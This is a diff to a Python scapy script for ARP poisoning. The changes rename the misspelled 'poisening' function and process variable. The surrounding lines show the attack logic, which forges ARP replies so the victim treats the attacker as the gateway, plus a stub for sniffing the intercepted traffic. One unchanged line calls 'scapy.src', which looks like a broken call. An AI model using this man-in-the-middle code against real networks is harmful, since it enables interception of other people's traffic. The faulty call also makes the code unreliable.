@@ -96,7 +96,7 @@ def get_mac_addr(ip):
     response_packet = scapy.src(arp_ether_send_packet, timeout=1, retry=10, verbose=False)[0]
     return response_packet[0][1].hwsrc
 
-def poisening(victimIP, victimMac, gatewayIP, gatewayMac):
+def poisoning(victimIP, victimMac, gatewayIP, gatewayMac):
     global poisoning_process
     
     victim_poison_packet = scapy.ARP(pdst=victimIP, psrc=gatewayIP, hwdst=victimMac, op=2)
@@ -127,6 +127,7 @@ def poisening(victimIP, victimMac, gatewayIP, gatewayMac):
 
 def sniffing(packetCount, interface):
     pass
+    
 
 if __name__ == "__main__":
     arguments = get_args()
@@ -142,8 +143,8 @@ if __name__ == "__main__":
     
     print_banner(victimIP, victimMac, gatewayIP, gatewayMac, interface)
     
-    poisening_process = Process(target=poisening, args=(victimIP, victimMac, gatewayIP, gatewayMac))
-    poisening_process.start()
+    poisoning_process = Process(target=poisoning, args=(victimIP, victimMac, gatewayIP, gatewayMac))
+    poisoning_process.start()
     
     if arguments.sniff:
         sniffing_process = Process(target=sniffing, args=(packetCount, interface))
